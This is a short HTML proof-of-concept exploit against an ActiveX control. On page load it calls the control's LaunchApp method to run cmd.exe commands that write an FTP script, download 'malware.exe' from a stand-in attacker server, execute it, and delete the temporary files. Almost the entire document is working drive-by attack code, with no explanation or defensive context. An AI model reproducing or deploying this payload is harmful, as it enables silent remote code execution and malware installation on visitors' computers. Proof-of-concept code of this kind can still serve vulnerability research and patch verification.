///////////////////////////////////
//Remote code execution PoC exploit
///////////////////////////////////

<html>
<head>
<script language="JavaScript">


var attackersFtpServerAddress="attacker.ftp.server";
var attackersFtpUname="IDidntDoAnything";
var attackersFtpPassword="password";
var executableFileName="malware.exe";
var cnt,p;

function spawn2()
{
	o2obj.LaunchApp("c:\\windows\\system32\\cmd.exe","/C echo open "+attackersFtpServerAddress+
		" >> c:\\ftpd&echo "+attackersFtpUname+">> c:\\ftpd&echo "+attackersFtpPassword+
		">> c:\\ftpd&echo binary>> c:\\ftpd&echo get "+executableFileName+
		"c:\\"+executableFileName+" >> c:\\ftpd&echo quit>> c:\\ftpd",0);
	o2obj.LaunchApp("c:\\windows\\system32\\cmd.exe","/C echo cd c:\\>> c:\\ftpd.bat"+
		"&echo ftp -s:ftpd>> c:\\ftpd.bat&echo start c:\\"+executableFileName+
		" >> c:\\ftpd.bat",0);
	o2obj.LaunchApp("c:\\windows\\system32\\cmd.exe","/C c:\\ftpd.bat&del "+
		"c:\\ftpd.bat&del c:\\ftpd&del c:\\"+executableFileName,0);
}

</script>
</head>

<body onload="spawn2()">
<object ID="o2obj" WIDTH=0 HEIGHT=0
   classid="clsid:62DDEB79-15B2-41E3-8834-D3B80493887A"
</object>
</body>
</html>
